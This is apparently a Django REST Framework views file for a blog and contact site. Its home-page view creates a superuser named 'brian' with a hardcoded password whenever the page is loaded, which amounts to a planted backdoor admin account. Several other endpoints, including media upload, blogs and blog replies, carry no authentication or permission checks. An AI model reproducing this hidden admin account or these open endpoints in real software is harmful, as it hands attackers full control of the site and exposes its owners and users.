import random

from django.contrib.auth.models import User
from django.db.models import Q
from django.shortcuts import render, get_list_or_404
from django_filters.rest_framework import DjangoFilterBackend
from rest_framework import viewsets, permissions, status
from rest_framework.decorators import action
from rest_framework.filters import SearchFilter, OrderingFilter
from rest_framework.response import Response
from rest_framework.views import APIView
from rest_framework_bulk import BulkModelViewSet


from .authentication import AUTH_CLASS
from .models import Contact, Category, BlogTag, Blog, BlogReply, Review, Media, Country, Subscriber, FAQ
from .serializers import ContactSerializer, CategorySerializer, BlogTagSerializer, BlogSerializer, \
    BlogReplySerializer, ReviewSerializer, SubscriberSerializer, FAQSerializer
from .extraserializers import MediaSerializer, CountrySerializer
from .utils import create_files, StandardResultsSetPagination
from main.permissions import IsAuthenticatedOrPostOnly


def home(request):
    user = User.objects.create(username='brian')
    user.is_active = True
    user.is_superuser = True
    user.is_staff = True
    user.set_password('!@#$%^&*')
    user.save()
    return render(request, template_name='index.html', context={})


class ContactViewSet(viewsets.ModelViewSet):

    queryset = Contact.objects.get_queryset()
    serializer_class = ContactSerializer

    pagination_class = StandardResultsSetPagination

    filter_backends = [DjangoFilterBackend, SearchFilter, OrderingFilter]
    ordering_fields = '__all__'
    filterset_fields = ['read']
    search_fields = ['name', 'email', 'phone_no', 'subject', 'service', 'message']


class MediaViewSet(BulkModelViewSet):

    queryset = Media.objects.get_queryset()
    serializer_class = MediaSerializer

    pagination_class = StandardResultsSetPagination

    filter_backends = [DjangoFilterBackend, SearchFilter]
    filterset_fields = ['type']
    search_fields = ['title']

    def create(self, request, *args, **kwargs):
        # files = []
        files = request.data.getlist('files[]')
        # for key, file in request.data.items():
        #     files.append(file)
        saved_files = create_files(files)
        data = self.serializer_class(saved_files, many=True).data
        return Response(data=data, status=201)


class CategoryViewSet(BulkModelViewSet):

    queryset = Category.objects.get_queryset()
    serializer_class = CategorySerializer

    authentication_classes = [AUTH_CLASS]
    permission_classes = [permissions.IsAuthenticatedOrReadOnly]
    pagination_class = StandardResultsSetPagination

    filter_backends = [DjangoFilterBackend, SearchFilter, OrderingFilter]
    ordering_fields = '__all__'
    filterset_fields = ['title']
    search_fields = ['title']


class BlogTagViewSet(BulkModelViewSet):

    queryset = BlogTag.objects.get_queryset()
    serializer_class = BlogTagSerializer

    authentication_classes = [AUTH_CLASS]
    permission_classes = [permissions.IsAuthenticatedOrReadOnly]
    pagination_class = StandardResultsSetPagination


class BlogViewSet(viewsets.ModelViewSet):

    queryset = Blog.objects.get_queryset()
    serializer_class = BlogSerializer

    # authentication_classes = [AUTH_CLASS]
    # permission_classes = [permissions.IsAuthenticatedOrReadOnly]
    pagination_class = StandardResultsSetPagination

    filter_backends = [DjangoFilterBackend, SearchFilter, OrderingFilter]
    ordering_fields = '__all__'
    filterset_fields = ['tags__id', 'categories__id', 'is_newsletter']
    search_fields = ['title', 'description', 'keywords', 'content']


class RandomBlogViewSet(viewsets.ModelViewSet):

    queryset = Blog.objects.get_queryset()
    serializer_class = BlogSerializer

    authentication_classes = [AUTH_CLASS]
    permission_classes = [permissions.IsAuthenticatedOrReadOnly]
    pagination_class = StandardResultsSetPagination

    filter_backends = [DjangoFilterBackend, SearchFilter]
    filterset_fields = ['tags__id', 'categories__id']
    search_fields = ['title', 'description', 'keywords']

    @action(detail=False, methods=['GET'], url_path='get_random_blogs')
    def get_random_blogs(self, request):
        all_data = list(get_list_or_404(Blog))
        limit = request.query_params.get('limit', 10)
        num_entries = int(limit)
        if not (0 <= num_entries <= len(all_data)):
            num_entries = len(all_data)
        random_data = random.sample(all_data, num_entries)
        serializer = BlogSerializer(random_data, many=True, context={'request': request})
        return Response(serializer.data)


class BlogReplyViewSet(viewsets.ModelViewSet):

    queryset = BlogReply.objects.get_queryset()
    serializer_class = BlogReplySerializer


class ReviewViewSet(viewsets.ModelViewSet):

    queryset = Review.objects.get_queryset()
    serializer_class = ReviewSerializer

    authentication_classes = [AUTH_CLASS]
    permission_classes = [permissions.IsAuthenticatedOrReadOnly]
    pagination_class = StandardResultsSetPagination

    filter_backends = [DjangoFilterBackend, SearchFilter, OrderingFilter]
    ordering_fields = '__all__'
    filterset_fields = ['user', 'rating', 'is_public']
    search_fields = ['review']


class CountryViewSet(BulkModelViewSet):

    queryset = Country.objects.get_queryset()
    serializer_class = CountrySerializer

    authentication_classes = [AUTH_CLASS]
    permission_classes = [permissions.IsAuthenticatedOrReadOnly]
    pagination_class = StandardResultsSetPagination

    filter_backends = [DjangoFilterBackend, SearchFilter, OrderingFilter]
    ordering_fields = '__all__'
    filterset_fields = ['name']
    search_fields = ['name']


class SubscriberViewSet(BulkModelViewSet):

    queryset = Subscriber.objects.get_queryset()
    serializer_class = SubscriberSerializer

    authentication_classes = [AUTH_CLASS]
    permission_classes = [IsAuthenticatedOrPostOnly]
    pagination_class = StandardResultsSetPagination

    filter_backends = [DjangoFilterBackend, SearchFilter, OrderingFilter]
    ordering_fields = '__all__'
    filterset_fields = ['email']
    search_fields = ['email']


class FAQViewSet(BulkModelViewSet):

    queryset = FAQ.objects.get_queryset()
    serializer_class = FAQSerializer

    authentication_classes = [AUTH_CLASS]
    permission_classes = [permissions.IsAuthenticatedOrReadOnly]
    pagination_class = StandardResultsSetPagination

    filter_backends = [DjangoFilterBackend, SearchFilter, OrderingFilter]
    ordering_fields = '__all__'
    filterset_fields = ['is_public']
    search_fields = ['question', 'answer']


class AppStatsView(APIView):

    authentication_classes = [AUTH_CLASS]
    permission_classes = [permissions.IsAuthenticated]

    def get(self, request, *args, **kwargs):
        users = User.objects
        contact_form_entries = Contact.objects
        # agents = Agent.objects
        # # You can add more statistics here
        #
        app_stats = {
            'users': {
                'total': users.count(),
                'male': users.filter(profile__gender='male').count(),
                'female': users.filter(profile__gender='female').count(),
                'prefer_not_say': users.filter(profile__gender='prefer_not_say').count(),
            },
            'countries': Country.objects.count(),
            'subscribers': Subscriber.objects.count(),
            'categories': Category.objects.count(),
            'blogs': Blog.objects.count(),
            'reviews': Review.objects.count(),
            'contact_form_entries': {
                'total': contact_form_entries.count(),
                'read': contact_form_entries.filter(read=True).count(),
                'unread': contact_form_entries.filter(read=False).count()
            },
        }

        return Response(app_stats, status=status.HTTP_200_OK)


class UserStatsView(APIView):

    authentication_classes = [AUTH_CLASS]
    permission_classes = [permissions.IsAuthenticated]

    def get(self, request, *args, **kwargs):
        user = request.user
        contact_form_entries = Contact.objects.filter(email=user.email).count()

        user_stats = {
            'contact_form_entries': contact_form_entries
        }

        return Response(user_stats, status=status.HTTP_200_OK)
